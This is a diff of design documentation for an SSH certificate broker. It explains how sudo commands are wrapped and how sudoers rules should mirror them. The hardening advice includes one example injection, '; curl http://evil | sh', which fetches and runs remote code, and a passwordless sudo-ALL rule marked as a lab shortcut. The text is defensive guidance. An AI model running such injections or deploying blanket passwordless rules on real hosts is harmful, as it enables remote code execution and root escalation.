@@ -125,14 +125,20 @@ elevate on its own. Validation (`internal/signer/signer.go`):
 - Regex over `sudo_user` (`^[a-zA-Z0-9_][a-zA-Z0-9_.-]{0,31}$`) — rejects flags
   and metacharacters.
 - Allowlist `allowed_sudo_users` (empty = root only).
-- The command is always wrapped as `prefix -- /bin/sh -c <shellQuote(cmd)>` to
-  prevent injection.
+- A **simple** command (one statement, statically-known words — `directArgv`)
+  is handed to sudo as a direct argv: `prefix -- systemctl restart nginx.service`.
+  The host's sudoers rule then authorizes the real binary with its literal
+  arguments, mirroring the `command_policies` string (#306).
+- Anything with shell semantics (pipes, sequences, redirects, env assignments,
+  expansions, globs) is wrapped as `prefix -- /bin/sh -c <shellQuote(cmd)>` to
+  prevent injection. Capability is identical either way; only the executed form
+  differs.
 
 ### One-shot (`ssh_execute` with `sudo=true`)
 
 ```
 broker → Intent{sudo=true, sudo_user="root", command="id", purpose=oneshot}
-signer → PolicyTable.Resolve → force-command = "sudo -n -- /bin/sh -c 'id'"
+signer → PolicyTable.Resolve → force-command = "sudo -n -- id"
        → cert with force-command baked in
 sshd   → enforces the force-command; the broker cannot modify it
 ```
@@ -142,7 +148,8 @@ sshd   → enforces the force-command; the broker cannot modify it
 ```
 broker → Intent{sudo=true, purpose=session} → signer returns ElevationPrefix="sudo -n"
        → ElevationPrefix stored in liveSession.elevationPrefix
-SessionExec("ls /root") → effective command: "sudo -n -- /bin/sh -c 'ls /root'"
+SessionExec("ls /root")     → effective command: "sudo -n -- ls /root"
+SessionExec("ls / | wc -l") → effective command: "sudo -n -- /bin/sh -c 'ls / | wc -l'"
 ```
 
 ### Session `shell`/`pty` with `sudo=true`
@@ -152,18 +159,45 @@ broker → OpenShell(client, "sudo -n -- /bin/sh")   ← whole shell elevated
        → the entire session runs as root in a single sudo process
 ```
 
-Host-side config (`/etc/sudoers.d/broker`):
+Host-side config (`/etc/sudoers.d/broker`). sudoers matches the rule's
+arguments against the user's argv joined by spaces (`fnmatch(3)`), so the rule
+must mirror what the broker actually executes (#305):
 
 ```sudoers
-# SSH account 'deploy', sudo to root without password:
+# SSH account 'deploy', sudo to root without password (lab shortcut):
 deploy ALL=(root) NOPASSWD: ALL
 
-# Restricted to specific commands (recommended in production):
-deploy ALL=(root) NOPASSWD: /usr/bin/systemctl, /usr/bin/journalctl
+# Restricted per command (recommended in production) — one line per allowed
+# SIMPLE command, matching the direct argv the signer emits:
+deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx.service
+deploy ALL=(root) NOPASSWD: /usr/bin/journalctl -u nginx --since -1h
+
+# A command with shell semantics keeps the /bin/sh -c wrapper, so its rule
+# authorizes /bin/sh with the wrapped argument. The anchored-regex form (sudo
+# >= 1.9.10) avoids the escaping minefield:
+deploy ALL=(root) NOPASSWD: /bin/sh ^-c journalctl -u nginx \| tail -n 50$
 
 # Sudo to a specific user:
 deploy ALL=(appuser) NOPASSWD: ALL
 ```
+
+sudoers argument matching is a minefield — every claim here was checked against
+a live `visudo -c`:
+
+- **Never use wildcards.** `fnmatch` runs without `FNM_PATHNAME`, so `*` crosses
+  spaces and `;`: `NOPASSWD: /bin/sh -c *` is `NOPASSWD: ALL`, and even
+  `systemctl restart *` matches an injected `; curl http://evil | sh`.
+- **Double quotes do not group arguments in a `Cmnd`** (only in `Defaults`
+  values) — they are matched as literal bytes, so a quoted rule never matches.
+- In the escaped-spaces form, escape the **spaces only**: `\|` is a *syntax
+  error* that invalidates the whole file, while a bare `|` inside the escaped
+  argument is fine
+  (`/bin/sh -c journalctl\ -u\ nginx\ |\ tail\ -n\ 50` parses and matches).
+- An unescaped `#` **silently truncates** a rule; unescaped `,` `:` `=` `\`
+  invalidate the file.
+
+Non-executing check that a rule matches, as root:
+`sudo -l -U deploy -- /usr/bin/systemctl restart nginx.service`.
 
 ---
 
